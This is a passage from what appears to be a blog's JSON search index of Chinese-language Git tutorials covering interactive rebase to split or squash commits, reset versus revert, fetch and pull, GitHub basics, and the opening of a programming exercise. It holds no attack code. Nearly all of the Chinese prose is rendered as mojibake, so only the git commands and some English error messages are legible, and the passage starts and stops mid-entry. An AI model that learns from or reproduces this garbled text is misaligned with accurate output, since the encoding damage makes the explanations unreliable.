ç°¡è¿°å‡è¨­ç›®å‰çš„ç´€éŒ„é•·é€™æ¨£ï¼š his-branch ä¸Šæœ‰ä¸€å€‹ AA BB CC DD EE çš„ commitï¼Œä¿®æ”¹çš„å…§å®¹å¦‚ä¸‹ï¼š ä½†æˆ‘æƒ³æŠŠä»–æ‹†é–‹æˆ 5 å€‹ commitï¼Œé€™æ™‚å€™å°±å¯ä»¥åˆ©ç”¨ rebase ä¾†è™•ç†ã€‚ é¦–å…ˆé–‹å•Ÿ rebase è¨­å®šæˆ‘å€‘æƒ³è¦é‡è¨­çš„ç¯„åœï¼š 1git rebase -i HEAD^ æ¥è‘—é€²å…¥äº’å‹•æ¨¡å¼ä»¥å¾Œï¼Œæ³¨æ„åˆ°æˆ‘å€‘æƒ³è¦æ›´æ–°çš„é‚£ä¸€ç­† commit ç´€éŒ„ï¼š é€™é‚Šæˆ‘å€‘è¦æŠŠ pick æ”¹æˆ editï¼Œå¥½è®“æˆ‘å€‘å¯ä»¥é‡æ–°è¨­å®šé€™ç­†ç´€éŒ„ï¼Œè¨­å®šå¥½å­˜æª”é›¢é–‹ä»¥å¾Œï¼Œæœƒçœ‹åˆ°ç›®å‰çš„ç‹€æ…‹å¦‚ä¸‹ï¼š 12345678åœæ­¢åœ¨ a852694... AA BB CC DD EEæ‚¨ç¾åœ¨å¯ä»¥ä¿®è£œé€™å€‹æäº¤ï¼Œä½¿ç”¨ git commit --amendç•¶æ‚¨å°è®Šæ›´æ„Ÿåˆ°æ»¿æ„ï¼ŒåŸ·è¡Œ git rebase --continue èƒ½çœ‹åˆ° rebase ç¢°åˆ° edit æ™‚å°±æœƒè‡ªå‹•åœä¸‹ä¾†ï¼Œè®“ä½ é‡æ–°å°é€™ç­† commit åšèª¿æ•´ï¼Œç›´åˆ°ä½ æœ€å¾Œèª¿æ•´å®Œæ™‚åŸ·è¡Œ git rebase --continue æ‰æœƒå®Œæˆæ•´å€‹ rebase çš„å‹•ä½œã€‚ å¥½ï¼Œç‚ºäº†é”æˆæˆ‘å€‘ä¸€é–‹å§‹çš„ç›®çš„ï¼Œæ¥ä¸‹ä¾†çš„æµç¨‹æœƒæ˜¯ï¼š å–æ¶ˆåŸæœ¬çš„ AA BB CC DD EE ç´€éŒ„ åˆ†åˆ¥æäº¤ AAã€BBã€CCã€DDã€EE çµæŸ rebase 1git reset HEAD^ reset å¾Œæ‰“é–‹ sourcetree æœƒçœ‹åˆ°ç›®å‰çš„ç‹€æ…‹é•·é€™æ¨£ï¼š æœƒçœ‹åˆ°ç¾åœ¨å¤šäº† Uncommit changesï¼Œé€™æ˜¯å› ç‚º reset çš„ mixed æ¨¡å¼ï¼ˆé è¨­å€¼ï¼‰æœƒæŠŠæª”æ¡ˆä¸Ÿå›ã€Œå·¥ä½œå€ï¼ˆWorking Directoryï¼‰ã€æ‰€å°è‡´çš„ã€‚é€™æ­£æ˜¯æˆ‘å€‘è¦çš„çµæœï¼Œæ‰€ä»¥ä¸ç”¨æ“”å¿ƒã€‚ é™„è¨»ï¼šä½ å¯èƒ½æœƒç™¼ç¾æ€éº¼åŸæœ¬çš„ AA BB CC DD EE é‚„åœ¨ï¼Ÿé€™ä¸€é»åœ¨ä¹‹å¾ŒçµæŸ rebase æ™‚å°±æœƒé‡æ–°èª¿æ•´äº†ï¼Œä¸ç”¨æ“”å¿ƒã€‚ ç¸½ä¹‹æ¥ä¸‹ä¾†åªè¦åˆ†åˆ¥æäº¤ AA BB CC DD EE çš„ç´€éŒ„å°±è¡Œäº†ï¼š 12345git commit -am 'AA' // æäº¤ AA çš„å…§å®¹git commit -am 'BB' // æäº¤ BB çš„å…§å®¹git commit -am 'CC' // æäº¤ CC çš„å…§å®¹git commit -am 'DD' // æäº¤ DD çš„å…§å®¹git commit -am 'EE' // æäº¤ EE çš„å…§å®¹ é™„è¨»ï¼šè¨˜å¾—è¦èª¿æ•´å…§å®¹å¾Œå†æäº¤ï¼Œä¸è¦ä¸€æ¬¡å…¨éƒ¨æäº¤ä¸Šå» ä¿®æ”¹å®Œä»¥å¾Œçš„ç‹€æ…‹æœƒé•·é€™æ¨£ï¼š è·Ÿæˆ‘å€‘å¸Œæœ›çš„çµæœå·®ä¸å¤šäº†ï¼Œé€™æ™‚å€™å°±èƒ½çµæŸ rebase äº†ï¼š 1git rebase --continue å¤§åŠŸå‘Šæˆå•¦ï¼š","link":"/2022/10/09/git-rebase-split-commit/"},{"title":"Git Rebaseï¼æŠŠå¤šå€‹ commit åˆæˆä¸€å€‹ commit","text":"æƒ³è¦ä¹¾æ·¨çš„ç´€éŒ„å°±é å®ƒã€‚ ç°¡è¿°å‡è¨­ç›®å‰çš„ç´€éŒ„é•·é€™æ¨£ï¼š æˆ‘æƒ³è¦æŠŠ Bã€Cã€D é€™ä¸‰å€‹ commit åˆæˆä¸€å€‹ï¼Œé‚£æˆ‘å¯ä»¥ç”¨ rebase ä¾†è™•ç†ã€‚ é¦–å…ˆæœƒä¸‹çš„æŒ‡ä»¤æ˜¯ï¼šgit rebase -i &lt;åŸºæº–é»&gt; -i æ˜¯ä»£è¡¨ä½¿ç”¨ã€Œäº’å‹•æ¨¡å¼ï¼ˆinteractivelyï¼‰ã€çš„æ„æ€ï¼Œè€Œ &lt;åŸºæº–é»&gt; æ˜¯ç”¨ä¾†å‘Šè¨´ Git æˆ‘å€‘æƒ³è¦ã€Œå¾ç›®å‰ HEAD çš„ä½ç½®åˆ°å“ªä¸€å€‹åŸºæº–é»ã€ä¾†åš rebase çš„å‹•ä½œã€‚ åƒåº•ä¸‹é€™å€‹æŒ‡ä»¤ï¼š 1git rebase -i 9f9d48d è½‰æ›æˆç™½è©±æ–‡çš„æ„æ€æ˜¯ï¼š æˆ‘æƒ³è¦å° HEAD (265a5ac) ~ A (9f9d48d) é€™å€‹ç¯„åœåš rebase çš„å‹•ä½œã€‚ è¨­å®šå®Œä»¥å¾Œå°±æœƒé€²å…¥äº’å‹•æ¨¡å¼çš„ç·¨è¼¯ç•«é¢ï¼ˆvimï¼‰ï¼š é™„è¨»ï¼šæ³¨æ„é€™é‚Šçš„é–±è®€é †åºæ˜¯ç”±ä¸Šåˆ°ä¸‹ï¼ˆèˆŠåˆ°æ–°ï¼‰ åŸºæœ¬ä¸Š pick å°±æ˜¯åŸå°ä¸å‹•ä¿ç•™ä¸‹ä¾†çš„æ„æ€ï¼Œè€Œé€™é‚Šä¸»è¦æœƒç”¨çš„æ˜¯ s (squash) é€™å€‹æŒ‡ä»¤ã€‚ä»–çš„ç”¨é€”æ˜¯æŠŠã€Œç›®å‰çš„é€™å€‹ commit è·Ÿå‰ä¸€å€‹åˆåœ¨ä¸€èµ·ã€ï¼Œæ‰€ä»¥æˆ‘å€‘æœƒé€™æ¨£è¨­å®šï¼š é™„è¨»ï¼šsquash å…¶å¯¦æ˜¯æŒ‡ã€Œæ“ ã€æã€çš„é€™å€‹å‹•ä½œ é¦–å…ˆæŠŠ D è·Ÿ C åˆåœ¨ä¸€èµ·ï¼Œæ¥è‘—å†æŠŠä½µå¥½çš„ Cã€D è·Ÿ B åˆåœ¨ä¸€èµ·ï¼Œæœ€å¾Œå°±æœƒè®ŠæˆåŒæ™‚æœ‰ B C D çš„æ–° commit ç´€éŒ„ã€‚ æœ€å¾Œå­˜æª”ä¸¦è¨­å®šå¥½æ–°çš„ commit message ä»¥å¾Œå°±å¯ä»¥çœ‹åˆ°æˆ‘å€‘æƒ³è¦çš„çµæœå›‰ï¼š","link":"/2022/10/08/git-rebase-squash-commit/"},{"title":"ä½¿ç”¨ Git é ç«¯åŠŸèƒ½æ™‚å¯èƒ½æœƒç¢°åˆ°çš„å•é¡Œ","text":"å¦‚é¡Œã€‚ ç•¶æœ¬åœ°èˆ‡é ç«¯ commit æ¬¡æ•¸ä¸åŒçš„æ™‚å€™å‡è¨­ä¸€é–‹å§‹æœ¬åœ°è·Ÿé ç«¯çš„ commit éƒ½æ˜¯ 10 æ¬¡ï¼Œç¾åœ¨æœ¬åœ°åšäº†æ›´æ–°å¾Œè®Šæˆ commit 11 æ¬¡ï¼Œä¹Ÿå°±æ˜¯æ¯”é ç«¯å¤šå‡ºä¸€æ¬¡ï¼Œé€™å€‹æ™‚å€™å¦‚æœä½ ç”¨ git status æœƒå¾—åˆ°ä»¥ä¸‹è¨Šæ¯ï¼š 123On branch masterYour branch is ahead of 'origin/master' by 1 commit. (use \"git push\" to publish your local commits) Git æœƒå‘Šè¨´ä½ ç›®å‰æœ¬åœ°ç«¯çš„ commit æ¬¡æ•¸æ¯”é ç«¯å¤šå¹¾æ¬¡ï¼ˆé€™è£¡æ˜¯ 1 æ¬¡ï¼‰ ä½†å¦‚æœåéä¾†ï¼Œç¾åœ¨æ˜¯ã€Œé ç«¯æ¯”æœ¬åœ° commit æ¬¡æ•¸é‚„è¦å¤šã€çš„æ™‚å€™ï¼ŒGit ä¸æœƒå‘Šè¨´ä½ é ç«¯æ¯”æœ¬åœ°çš„ commit é‚„è¦å¤šçš„é€™å€‹è¨Šæ¯ã€‚ åœ¨é ç«¯é€²è¡Œåˆä½µçš„å‹•ä½œå‡è¨­é ç«¯æœ‰ master è·Ÿ AAA åˆ†æ”¯ï¼Œä½ å¯ä»¥åœ¨ GitHub ç™¼é€ä¸€å€‹ pull request è·ŸåŸä½œè€…èªªï¼Œã€Œæ¬¸ï¼Œæˆ‘æƒ³è¦æŠŠ AAA åˆä½µåˆ° masterï¼Œå¯ä»¥å—ï¼Ÿã€ã€‚ ä½œè€…å¦‚æœåŒæ„çš„è©±ï¼ŒAAA å°±æœƒè¢«åˆä½µåˆ° masterï¼Œå®Œæˆé€™å€‹ pull requestï¼Œæ›å¥è©±èªªå°±æ˜¯ã€Œåœ¨é ç«¯æŠŠå…©å€‹åˆ†æ”¯çµ¦åˆä½µã€çš„æ„æ€ã€‚ å¾é ç«¯åŒæ­¥åˆ°æœ¬åœ°æ™‚è¦ç‰¹åˆ¥æ³¨æ„çš„äº‹ï¼ˆ1ï¼‰å¦‚æœé ç«¯çš„ commit æ¯”æœ¬åœ°ç«¯è¶…å‰é€²åº¦ï¼Œé‚£å¾æœ¬åœ°è¦ push åˆ°é ç«¯æ™‚ï¼ŒGit æœƒå‘Šè¨´ä½ ï¼š 1234hint: Updates were rejected because the remote contains work that you dohint: not have locally. This is usually caused by another repository pushinghint: to the same ref. You may want to first integrate the remote changeshint: (e.g., 'git pull ...') before pushing again. ç°¡å–®ä¾†èªªçš„æ„æ€å°±æ˜¯ï¼šåŒæ­¥é ç«¯å¤±æ•—ï¼Œå› ç‚ºé ç«¯çš„ repository é€²åº¦è¶…å‰ï¼ˆè¢«åˆ¥äººæ›´æ–°éå…§å®¹ï¼‰ï¼Œæ‰€ä»¥ä½ å¾—å…ˆç”¨ pull æŠŠç›®å‰æœ€æ–°çš„ç‰ˆæœ¬æŠ“ä¸‹ä¾†ï¼Œå†é‡æ–° push ä¸Šå»ã€‚ å¾é ç«¯åŒæ­¥åˆ°æœ¬åœ°æ™‚è¦ç‰¹åˆ¥æ³¨æ„çš„äº‹ï¼ˆ2ï¼‰å¦‚æœä½ åœ¨é ç«¯å»ºç«‹æ–°çš„ repository ä¸¦ä¸”é€äº†å¹¾å€‹ commitï¼Œç•¶ä½ è¦ pull åˆ°æœ¬åœ°ç«¯çš„æ™‚å€™æœƒå™´ä¸€æ®µéŒ¯èª¤ï¼š ï¼ˆæˆ–è€…æ˜¯ä½ æœ¬åœ°ç«¯çš„ .git æª”æ¡ˆè¢«åˆªæ‰äº†ä¹Ÿæœ‰å¯èƒ½ç™¼ç”Ÿï¼‰ 1fatal: refusing to merge unrelated histories æ„æ€æ˜¯èªªé ç«¯è·Ÿæœ¬åœ°ç«¯çš„æ­·å²ç´€éŒ„ï¼ˆcommitï¼‰ä¸ç›¸å¹²ï¼Œæ‰€ä»¥ä¸è®“ä½  mergeã€‚ è§£æ±ºçš„è¾¦æ³•æ˜¯åŠ ä¸Š â€“allow-unrelated-historiesï¼š 1git pull origin master â€“allow-unrelated-histories åœ¨åˆ†æ”¯ A ä¸Š pull åˆ†æ”¯ B æœƒæ€æ¨£ï¼Ÿå¦‚æœä½ åœ¨ A åˆ†æ”¯ç”¨ git pull origin Bï¼Œé€™å€‹æ„æ€æ˜¯ã€Œæˆ‘è¦è®“ A è·Ÿ B çš„æª”æ¡ˆåŒæ­¥ã€ï¼Œä½†ä½ ä¹ŸçŸ¥é“é€™å…©å€‹æ˜¯ä¸åŒçš„åˆ†æ”¯ï¼Œé‚£æ€éº¼è¾¦ï¼Ÿ é‚£å°±è®“ä»–è®Šæˆä¸€å€‹åˆ†æ”¯å°±å¥½äº†å•Šï¼ æ²’éŒ¯ï¼ŒGit ä¹Ÿæ˜¯é€™æ¨£æƒ³çš„ï¼Œæ‰€ä»¥ Git æœƒå…ˆå¹«ä½ æŠŠ B åˆä½µåˆ° A é€™å€‹åˆ†æ”¯ï¼Œæ¥è‘—åœ¨æŠŠæª”æ¡ˆçµ¦åŒæ­¥ã€‚ ä¸éè¦æé†’ä½ ï¼Œåœ¨ä¸åŒçš„åˆ†æ”¯ç”¨ git pull é€™å€‹æŒ‡ä»¤æ˜¯æœ‰é»ä¸åˆé‚è¼¯çš„ï¼ˆä½ æ€éº¼æœƒæƒ³æŠŠå…©å€‹ä¸åŒçš„åˆ†æ”¯åšã€ŒåŒæ­¥ã€çš„å‹•ä½œï¼Ÿï¼‰ï¼Œæ‰€ä»¥å¦‚æœä½ ç¡¬è¦é€™æ¨£åšçš„è©±ï¼ŒGit é‚„æ˜¯æœƒå¹«ä½ åšï¼Œä½†å®ƒæœƒè·³ä¸€äº›è¨Šæ¯æé†’ä½ ï¼š ï¼ˆGit æœƒè¦ä½ è§£é‡‹ä¸€ä¸‹ï¼Œwhy ä½ è¦é€™æ¨£åšï¼Ÿï¼‰","link":"/2021/12/13/git-remote-problem/"},{"title":"Gitï¼reset èˆ‡ revert çš„å·®åˆ¥","text":"å¥½ä¹…ä¸è¦‹ä¾†å€‹ Gitã€‚ ç°¡è¿°é€™é‚Šæˆ‘å€‘ç›´æ¥æ‹¿ç¯„ä¾‹ä¾†è§£é‡‹ï¼Œå‡è¨­é€™æ˜¯ä¸€é–‹å§‹çš„ç´€éŒ„ï¼š åŸ·è¡Œ git reset HEAD^ ä»¥å¾Œçš„çµæœå¦‚ä¸‹ï¼š åŸ·è¡Œ git revert HEAD ä»¥å¾Œçš„çµæœå¦‚ä¸‹ï¼ˆæ³¨æ„æ²’æœ‰ ^ï¼‰ï¼š ç°¡å–®ä¾†èªªå…©å€‹éƒ½æ˜¯å›åˆ°ä¸Šä¸€å€‹ commit çš„ç´€éŒ„é»ï¼Œä½†å·®åˆ¥åœ¨æ–¼ reset æ˜¯ç›´æ¥æŠŠè©²ç­†ç´€éŒ„æ¸…é™¤ï¼Œè€Œ revert å‰‡æ˜¯é¡å¤–ç”¢ç”Ÿä¸€å€‹æ–°çš„ commit ç´€éŒ„ã€‚ ç•¶æ™‚æˆ‘å° revert çš„æ–¹å¼æœ‰é»ç–‘å•ï¼Œå› ç‚ºæ˜æ˜ç›´æ¥æ¸…æ‰ä¸æ˜¯æ›´ä¹¾è„†å—ï¼Ÿä½•å¿…å¤šç”¢ç”Ÿä¸€ç­†æ–°çš„ commitï¼Ÿä½†é€™é‚Šå¯ä»¥å…ˆæ€è€ƒä¸€ä»¶äº‹æƒ…ï¼š å¦‚æœé€™äº›ç´€éŒ„æ˜¯æœ‰æ¨åˆ°é ç«¯ä¸Šçš„è©±ï¼Œä½ åœ¨æœ¬åœ°åš reset çš„è©±è¦æ€éº¼åŒæ­¥åˆ°é ç«¯ä¸Šï¼Ÿ æœ‰æ“ä½œéé ç«¯å€‰åº«çš„äººä¸€å®šéƒ½çŸ¥é“ï¼Œå¦‚æœåœ¨æœ¬åœ°åš reset çš„è©±æ˜¯æ²’è¾¦æ³•æŠŠé€™äº›è³‡è¨Š push ä¸Šå»çš„ï¼Œå› ç‚º Git æœƒè·Ÿä½ èªªæœ¬åœ°ç«¯è½å¾Œé ç«¯çš„é€²åº¦ã€‚å”¯ä¸€çš„æ–¹æ³•åªæœ‰ç”¨ git push -f ä¾†å¼·åˆ¶æ›´æ–°ï¼ˆä½†ä¸€èˆ¬ä¸å¤ªå¯èƒ½é€™æ¨£åšï¼‰ï¼Œå¦å‰‡çš„è©±æ˜¯æ²’è¾¦æ³•åŒæ­¥åˆ°é ç«¯ä¸Šçš„ã€‚ å¯æ˜¯å¦‚æœæ˜¯ revert çš„åšæ³•å°±ä¸æœƒæœ‰é€™å€‹å•é¡Œï¼Œå› ç‚ºä½ æ˜¯æŠŠå…§å®¹é‡ç½®å¾Œåœ¨å»ºç«‹ä¸€ç­†æ–°çš„ commit ç´€éŒ„ï¼Œæ—¢ç„¶é€™æ˜¯æ–°çš„ commit ç´€éŒ„ï¼Œå°±ä¸æœƒæœ‰å‰›å‰›æœ¬åœ°ç«¯è½å¾Œé ç«¯çš„å•é¡Œï¼Œæ‰€ä»¥é€™æ™‚å€™å°±å¯ä»¥é †åˆ©çš„æŠŠé ç«¯ä¹Ÿåš reset çš„æ›´æ–°ã€‚","link":"/2022/10/03/git-reset-and-revert-difference/"},{"title":"Git ä¸­çš„ç‹€æ³åŠ‡","text":"å„ç¨®ç”¨ Git æ™‚å¯èƒ½æœƒç™¼ç”Ÿçš„æƒ…å¢ƒã€‚ commit è¨Šæ¯æ‰“éŒ¯å­—git commit --amendï¼ˆåƒ…é™ä¸Šä¸€æ¬¡çš„ commitï¼‰ commit åˆå¾Œæ‚”äº†git reset HEAD^ --hardï¼Œæˆ‘å‰›å‰›ç™¼çš„ commit è·Ÿåšçš„æ±è¥¿æˆ‘å…¨éƒ½ä¸è¦äº†ã€‚git reset HEAD^ --softï¼Œæˆ‘åªæ˜¯æ”¶å› commitï¼Œä½†æˆ‘å…§å®¹é‚„è¦ç•™è‘—ã€‚git reset HEAD^ --mixedï¼Œè·Ÿ â€“soft çš„æ•ˆæœä¸€æ¨£ï¼Œå·®åˆ¥åªåœ¨æ–¼ â€“mixed æœƒé€€å›åˆ° Untracked çš„ç‹€æ…‹ã€‚ ä½ å¯ä»¥æŠŠ HEAD æƒ³æˆæ˜¯æˆ‘å€‘åœ¨ã€Œè³‡æ–™å¤¾æ¨¡æ“¬æ³•ã€ä¸­æåˆ°çš„é‚£å€‹ï¼Œã€Œç”¨ä¾†è¨˜éŒ„æœ€æ–°çš„ç‰ˆæœ¬æ˜¯å“ªä¸€å€‹ã€çš„æª”æ¡ˆï¼Œæ‰€ä»¥ HEAD^ çš„æ„æ€å°±æ˜¯ã€Œæœ€æ–°ç‰ˆæœ¬çš„å‰ä¸€å€‹ã€çš„æ„æ€ã€‚ å¦‚æœè¦æŒ‡å®šå‰å¾ˆå¤šå€‹çš„ç‰ˆæœ¬ï¼Œä¹Ÿå¯ä»¥ç”¨ ã€ŒHEAD^æ•¸å­—ã€çš„æ–¹å¼ä¾†è¡¨ç¤ºã€‚ é‚„æ²’ commitï¼Œä½†æˆ‘å‰›å‰›æ”¹çš„æ±è¥¿ä¸è¦äº†git restore file-name æŒ‡å®šæŸå€‹æª”æ¡ˆgit restore . æ‰€æœ‰æª”æ¡ˆ æˆ‘æƒ³è¦æ”¹åˆ†æ”¯çš„åå­—git branch -m new-branch-name è¨˜å¾—è¦åˆ‡æ›åˆ°ä½ æƒ³è¦æ”¹åå­—çš„é‚£å€‹åˆ†æ”¯ã€‚ æŠŠé ç«¯çš„ branch æ‘˜ä¸‹ä¾†git checkout branch-name åœ¨ä½  clone æŸäº› Repository åˆ°æœ¬åœ°ç«¯çš„æ™‚å€™ï¼Œä½ å¯èƒ½æœƒç™¼ç¾æœ‰äº›é ç«¯çš„åˆ†æ”¯åœ¨è‡ªå·±çš„é›»è…¦ä¸Šä¸æœƒé¡¯ç¤ºå‡ºä¾†ã€‚ é€™å€‹æ™‚å€™ä½ åªè¦ç”¨é€™å€‹åˆ‡æ›åˆ†æ”¯çš„æŒ‡ä»¤ï¼ŒGit å°±æœƒè‡ªå‹•æŠŠé ç«¯çš„ branch æ‘˜ä¸‹ä¾†äº†ã€‚ åƒè€ƒè³‡æ–™Git reset çš„ä¸‰ç¨®æ¨¡å¼( soft mixed hard )æ¯”è¼ƒgit reset - é‚„åŸç‰ˆæœ¬","link":"/2021/12/13/git-situation/"},{"title":"Gitï¼åŒæ­¥é ç«¯çš„æ–¹å¼","text":"åˆä¾†å¡«å‘å•¦ã€‚ æŒ‡ä»¤å…ˆæŠŠé ç«¯æœ€æ–°çš„é€²åº¦æŠ“ä¸‹ä¾†ï¼ˆæ˜¯é€²åº¦ä¸æ˜¯æª”æ¡ˆï¼‰ 1git fetch åˆ‡æ›åˆ°æƒ³è¦åŒæ­¥çš„åˆ†æ”¯ 1git checkout &lt;branch-name&gt; åˆä½µ 1git merge origin/&lt;branch-name&gt; é€™æ¨£å­é‚£å€‹åˆ†æ”¯çš„æª”æ¡ˆå°±æœƒè·Ÿé ç«¯æ˜¯åŒæ­¥çš„ç‹€æ…‹äº†ã€‚ Source tree å…ˆ fetch é ç«¯çš„é€²åº¦ çœ‹åˆ°æ›´æ–°çš„é€²åº¦å¾Œï¼ŒæŠŠä»– merge åˆ°ä½ æƒ³è¦çš„åˆ†æ”¯ä¸Š é€™æ¨£å°±æå®šäº†ã€‚ é—œæ–¼ fetch èˆ‡ pullï¼ˆåŸç†ï¼‰ç°¡å–®ä¾†èªªï¼Œæˆ‘å€‘è¦è®“é€²åº¦åŒæ­¥ä¸»è¦éœ€è¦å…©å€‹æ¢ä»¶ï¼š å–å¾—é€²åº¦ æŠŠæœ€æ–°é€²åº¦è·ŸåŸå§‹é€²åº¦åšåˆä½µ æ‰€ä»¥æˆ‘å€‘å¹³å¸¸åœ¨ç”¨ pull origin master çš„æ„æ€å…¶å¯¦æ˜¯ï¼š 1. å…ˆæŠŠæœ€æ–°é€²åº¦æŠ“ä¸‹ä¾†ï¼ˆæ˜¯é€²åº¦ä¸æ˜¯æª”æ¡ˆï¼‰ 1git fetch &lt;remote&gt;ï¼ˆå¦‚æœä½ æœ‰å¾ˆå¤šå€‹æ‰éœ€è¦ç‰¹åˆ¥æŒ‡å®šï¼‰ 2. åˆä½µåˆ°æˆ‘ç›®å‰çš„åˆ†æ”¯ï¼ˆæ³¨æ„æ˜¯ç”¨æ–œç·šåˆ†éš”ï¼‰ 1git merge origin/master æ‰€ä»¥åˆèµ·ä¾†æ‰æœƒæ˜¯ï¼š 1git pull origin master é€™å€‹å°±æ˜¯ fetch è·Ÿ pull çš„å·®åˆ¥ï¼Œå¸Œæœ›èƒ½å¹«åŠ©è‡ªå·±é‡æ¸…é—œæ–¼åˆ†æ”¯çš„ç–‘æƒ‘ã€‚ åƒè€ƒè³‡æ–™ ã€ç‹€æ³é¡Œã€‘æ€éº¼è·Ÿä¸Šç•¶åˆ fork å°ˆæ¡ˆçš„é€²åº¦ï¼Ÿ Pull ä¸‹è¼‰æ›´æ–°","link":"/2022/06/07/git-sync-remote/"},{"title":"GitHub çš„ä¸€äº›åŸºæœ¬åŠŸèƒ½","text":"ä¸€äº›æˆ‘ä¹…æ²’ç”¨çš„è©±å¤§æ¦‚æœƒå¿˜è¨˜çš„åŸºæœ¬åŠŸèƒ½ã€‚ commitå¯ä»¥ç”¨ä¾†çœ‹æ¯ä¸€æ¬¡çš„ commit ç´€éŒ„ï¼Œé‚„æœ‰æ¯å€‹ commit æ”¹äº†å“ªäº›æ±è¥¿ï¼Œæ¯å€‹ commit æ™‚çš„æª”æ¡ˆå…§å®¹ã€‚ blameæŸ¥çœ‹æª”æ¡ˆçš„å…§å®¹æ˜¯èª°ç·¨è¼¯çš„ï¼ˆæŠ“å…‡æ‰‹ï¼‰ï¼Œæ¯ä¸€è¡Œéƒ½æœƒé¡¯ç¤ºæœ€å¾Œç·¨è¼¯çš„äººæ˜¯èª°ã€‚ issueå¯ä»¥åœ¨é€™è£¡æå‡ºå°é€™å€‹å°ˆæ¡ˆæœ‰å•é¡Œçš„åœ°æ–¹ï¼Œè§£æ±ºäº†è©±å¯ä»¥ closeã€‚ contributoræœ‰èª°è·Ÿä½ ä¸€èµ·å”ä½œã€‚ exploreå¯ä»¥çœ‹åˆ°å…¶ä»–äººçš„ repositoryã€‚","link":"/2021/12/13/github-basic-usage/"},{"title":"GitHub çš„ä¸€äº›å°çŸ¥è­˜","text":"é€™ç¯‡æœƒè¬›ä¸€ä¸‹ GitHub æ˜¯ä»€éº¼ï¼Œé‚„æœ‰ GitHub çš„å»ºè­°å·¥ä½œæµç¨‹ï¼Œé‚„æœ‰ GitHub Pages çš„ä½¿ç”¨ã€‚ é—œæ–¼ GitHubå…±ç”¨ä¸€å€‹ Git çš„å°ˆæ¡ˆ = repositoryï¼Œé‚£è¦æ€éº¼å…±äº« repositoryï¼Ÿ æŠŠå°ˆæ¡ˆä¸Šå‚³åˆ°æŸå€‹åœ°æ–¹ï¼ˆGitHubï¼‰ï¼Œè®“åˆ¥äººå¯ä»¥ä¸‹è¼‰ä¸‹ä¾†ã€‚ GitHub å…¶å¯¦å°±æ˜¯ä¸€å€‹å¯ä»¥æ”¾ .git è³‡æ–™å¤¾çš„ã€Œåœ°æ–¹ã€ ä½ å¯ä»¥åªç”¨ Gitï¼Œä¸ç”¨ GitHubï¼›ä½†ä¸å¯ä»¥åªç”¨ GitHubï¼Œä¸ç”¨ Gitã€‚ GitHub work-flowç°¡å–®ä¾†èªªå°±æ˜¯å·¥ä½œæµç¨‹ï¼Œåªè¦ä½ æƒ³è¦æ–°å¢ä»€éº¼åŠŸèƒ½æˆ–ä¿®å¾©ï¼Œå°±å¯ä»¥åƒè€ƒé€™å€‹æ­¥é©Ÿï¼š å»ºç«‹æ–°åˆ†æ”¯ åœ¨æ–°åˆ†æ”¯ä¸Š commit ç™¼å‡º pull request å¤§å®¶ code review åšè¨è«–ï¼ˆreview å¾Œå¯ä»¥åš approve çš„å‹•ä½œï¼‰ éƒ¨å±¬ï¼ˆdeployï¼‰ åˆä½µï¼ˆmergeï¼‰ åˆªé™¤åˆ†æ”¯ GitHub Pageså°±æ˜¯å¯ä»¥åœ¨ä¸Šé¢æ”¾ã€Œéœæ…‹æª”æ¡ˆã€çš„é é¢ã€‚ GitHub Pages é é¢çš„é è¨­ã€Œæ ¹è·¯å¾‘ã€æ˜¯ https://github.com/jubeatt/repository-nameï¼Œå®ƒæœƒå»æ‰¾ä½  repository ä¸­çš„ index.html æª”æ¡ˆï¼Œå¦‚æœæ‰¾ä¸åˆ°çš„è©±å°±æœƒé¡¯ç¤º 404ã€‚ å¦‚æœä½ è¦åœ¨é é¢ä¸­å¯Ÿçœ‹æŸå€‹æª”æ¡ˆçš„å…§å®¹ï¼Œåªè¦åœ¨æ ¹è·¯å¾‘å¡«ä¸Šå°æ‡‰çš„ã€Œç›¸å°è·¯å¾‘ã€å°±è¡Œäº†ï¼š 1234å‡è¨­é€™æ˜¯å°ˆæ¡ˆçš„è³‡æ–™å¤¾çµæ§‹-- repository-name -- aaa.txt -- bbb.rxt æˆ‘å¦‚æœæƒ³çœ‹ aaa.txt çš„é é¢ï¼šhttps://github.com/jubeatt/repository-name/aaa.txt æˆ‘å¦‚æœæƒ³çœ‹ aaa.txt çš„é é¢ï¼šhttps://github.com/jubeatt/repository-name/bbb.txt GitLab èˆ‡ Bitbucketå…¶å¯¦å°±æ˜¯ä¸åŒçš„å¹³å°ï¼Œæ¯”è¼ƒå¤§çš„å·®ç•°å¯èƒ½åœ¨ UIï¼Œä½†ä½¿ç”¨æ–¹å¼è·Ÿ GitHub å¤§è‡´ä¸Šå¾ˆé›·åŒã€‚","link":"/2021/12/13/github-knowledge/"},{"title":"è²ªå©ªçš„å°å·","text":"é€™æ˜¯ä¾†è‡ª LIOJ ä¸Šçš„é¡Œç›®ï¼Œå› ç‚ºé™·é˜±é‚„è »ç‰¹åˆ¥çš„ï¼Œæ‰€ä»¥æƒ³è¨˜éŒ„ä¸‹ä¾†ã€‚ é­”é¬¼è—åœ¨ç´°ç¯€è£¡æˆ‘æƒ³å¾ˆå¤šäººæ‡‰è©²éƒ½å¾ˆå›°æƒ‘æ˜æ˜åœ¨è‡ªå·±é›»è…¦è·‘éƒ½ OKï¼Œä½†ç³»çµ±é‚„æ˜¯ä¸€ç›´å™´ Wrong Answer (Â´âŠ™Ï‰âŠ™`) æˆ‘å…¶å¯¦ä¹Ÿæäº†è€åŠå¤©æ‰ç™¼ç¾ï¼Œä½†åœ¨è¨è«–é™·é˜±ä¹‹å‰ï¼Œå…ˆè«‡è«‡é€™é¡Œçš„è§£æ³•ã€‚ é€™é¡Œçš„è§£æ³•å…¶å¯¦ä¸é›£ï¼Œå°±æ˜¯ã€Œæ ¹æ“šå°å·å¯ä»¥å·çš„æ•¸é‡ï¼ŒæŠŠæ¯æ¨£ç‰©å“åƒ¹æ ¼ç”±å¤§åˆ°å°åšåŠ ç¸½ã€ï¼Œæ‰€ä»¥æˆ‘æ˜¯é€™æ¨£åšçš„ï¼š æŠŠç‰©å“é™£åˆ—åšæ’åºï¼Œç”±å¤§æ’åˆ°å° æŠŠé™£åˆ—åŠ ç¸½ï¼Œå¾ç¬¬ä¸€å€‹åŠ åˆ°ç¬¬ n å€‹ï¼ˆn = å°å·èƒ½å·çš„ç¸½æ•¸é‡ï¼‰ 12345678910111213141516171819202122232425function solve(lines) { // å°å·èƒ½å·åˆ°çš„ç¸½é‡‘é¡ let totalValue = 0 // å°å·èƒ½å¸¶èµ°ç‰©å“çš„æœ€å¤§æ•¸é‡ const max = Number(lines[0]) // æ‰€æœ‰ç‰©å“ï¼ˆé™¤æ‰å‰å…©ç­†å…ƒç´ 